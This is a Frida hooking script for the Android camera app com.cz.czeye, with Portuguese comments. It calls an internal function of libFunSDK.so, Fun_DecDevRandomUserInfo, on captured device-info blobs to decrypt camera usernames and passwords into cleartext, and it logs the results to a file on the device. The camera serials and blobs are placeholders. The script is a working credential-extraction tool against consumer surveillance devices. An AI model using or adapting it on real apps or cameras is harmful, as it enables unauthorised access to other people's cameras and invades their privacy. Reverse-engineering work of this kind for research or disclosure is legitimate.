/*
 * zz-deccall.js — chama Fun_DecDevRandomUserInfo(p1,p2,out) do libFunSDK nos
 * blobs Info capturados do GetRandomUser, pra obter user/senha em claro.
 * Testa ordens de args (SN,Info) e (Info,SN). Saída: files/dec.txt
 */
(function () {
  var OUT = "/data/data/com.cz.czeye/files/dec.txt", LIB = "libFunSDK.so";
  function save(l){ console.log("[dec] "+l.substring(0,180)); try{var f=new File(OUT,"a");f.write(l+"\n");f.flush();f.close();}catch(e){} }
  save("LOADING deccall");
  var sym = "_Z24Fun_DecDevRandomUserInfoPKcS0_Pc";
  var addr = Module.findExportByName(LIB, sym);
  save("addr=" + addr);
  if (!addr) { save("NAO achei a função"); return; }

  // tipos de retorno possíveis; tentamos 'int'
  var fn = new NativeFunction(addr, "int", ["pointer", "pointer", "pointer"]);

  var CASES = [
    { sn: "SN_CAMERA_1", info: "<INFO_BASE64>" },
    { sn: "SN_CAMERA_2", info: "<INFO_BASE64>" },
    { sn: "SN_CAMERA_3", info: "<INFO_BASE64>" },
  ];

  function cstr(s){ return Memory.allocUtf8String(s); }
  function readout(p){
    try {
      // lê como string C; se binário, hex dos primeiros 64B
      var s = p.readUtf8String();
      if (s && /[ -~]/.test(s)) return JSON.stringify(s);
    } catch (e) {}
    try { var b=p.readByteArray(64); var u=new Uint8Array(b),h=""; for(var i=0;i<u.length;i++)h+=("0"+u[i].toString(16)).slice(-2); return "hex:"+h; } catch(e){ return "<?>"; }
  }

  // espera o SDK inicializar um pouco
  setTimeout(function () {
    try {
      CASES.forEach(function (c) {
        // ordem A: (SN, Info, out)
        var out1 = Memory.alloc(512); out1.writeByteArray(new Array(512).fill(0));
        var r1 = fn(cstr(c.sn), cstr(c.info), out1);
        save("A (SN,Info) " + c.sn.substring(0,6) + " ret=" + r1 + " out=" + readout(out1));
        // ordem B: (Info, SN, out)
        var out2 = Memory.alloc(512); out2.writeByteArray(new Array(512).fill(0));
        var r2 = fn(cstr(c.info), cstr(c.sn), out2);
        save("B (Info,SN) " + c.sn.substring(0,6) + " ret=" + r2 + " out=" + readout(out2));
      });
      save("DONE");
    } catch (e) { save("ERRO call: " + e); }
  }, 4000);
})();
